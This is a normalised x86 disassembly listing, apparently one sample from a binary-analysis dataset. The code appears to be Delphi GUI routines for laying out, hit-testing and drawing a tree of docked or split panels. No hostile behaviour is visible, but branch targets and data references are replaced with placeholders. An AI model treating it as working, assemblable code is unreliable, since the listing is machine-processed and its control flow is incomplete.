test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_442e50
mov edx esi
call sub_442e60
sub_442e9c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_442e24
mov edi eax
mov eax ebx
call sub_442960
cmp edi eax
jl r-xdata
mov eax esi
call sub_442b0c
mov eax [ esi + 0x1c ]
push eax
push sub_4449ac
mov edx esi
call sub_4431d8
mov eax ebx
call sub_442e24
mov edi eax
mov eax esi
call sub_4429a8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_442e9c
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_442f08
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44292c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_442f30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030d4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403428
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4428d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d24c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_423ea8
mov edx eax
mov eax ebx
call sub_41d3c8
mov eax [ ebp - 0x4 ]
call sub_443100
xor eax eax
push ebp
push sub_44303c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43d858
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_442b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443043
mov eax [ ebp - 0x4 ]
call sub_443104
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43d81c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_443043
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_444ed4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_443098
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_444104
mov eax [ esi + 0x10 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_443118
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_443118
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_443118
pop ecx
sub_443170
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_443118
pop ecx
sub_44319c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44319c
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44319c
pop ecx
sub_4431f0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_443170
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_442a5c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_442a5c
push eax
mov edx 0x1
mov eax ebx
call sub_4429f0
push eax
mov edx 0x2
mov eax ebx
call sub_4429f0
pop edx
pop ecx
call sub_412960
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b18
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_443274
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_442cac
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412960
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439d0c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4428d8
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_443170
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_4428fc
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44419c
mov edx esi
mov eax ebx
call sub_443170
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43a2f0
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4428d8
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43a2dc
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_442a5c
mov edx eax
mov eax edi
call sub_442e4c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_442a5c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_442a5c
mov edx eax
mov eax edi
call sub_442e4c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_442a5c
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_443484
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44362c
jmp r-xdata
sub_443484
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4428d8
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_442e24
mov edx eax
mov eax ebx
call sub_442e4c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_442e4c
mov eax [ esi + 0x64 ]
call sub_442e24
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4444f4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4431d8
mov eax [ esi + 0x64 ]
call sub_442e24
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4444f4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4431d8
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_444878
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4431d8
mov eax [ esi + 0x64 ]
call sub_442e24
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_4449ac
xor edx edx
mov eax esi
call sub_4431d8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_442e4c
adc edx 0x0
mov eax ebx
call sub_442b0c
mov eax ebx
call sub_442e9c
push esi
push sub_4449ac
xor edx edx
mov eax esi
call sub_4431d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_44362c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_442b0c
mov eax [ ebx + 0x14 ]
call sub_442e9c
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4436a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_442e24
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_442e24
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_442e24
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4429f0
mov esi eax
mov edx 0x2
mov eax ebx
call sub_4429f0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_442e24
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_442efc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_442f24
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442efc
call sub_4436a4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442f24
call sub_4436a4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_442a5c
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_442a5c
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4438d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43d858
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43d81c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412910
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443964
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4438d0
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_442f24
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_443170
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_442f24
call sub_4436a4
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_4439ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403e54
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4044a0
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_443a34
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_443c2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_444104
mov eax [ ebp - 0x8 ]
call sub_443100
xor edx edx
push ebp
push sub_443c0f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c16
mov eax [ ebp - 0x8 ]
call sub_443104
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4428d8
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_4439ec
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403300
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_442bf8
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4439ec
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43a26c
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43b040
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403104
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_443c3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412938
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41db3c
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443c94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d114
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d870
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d810
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d810
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d114
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d810
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d810
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_443d1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
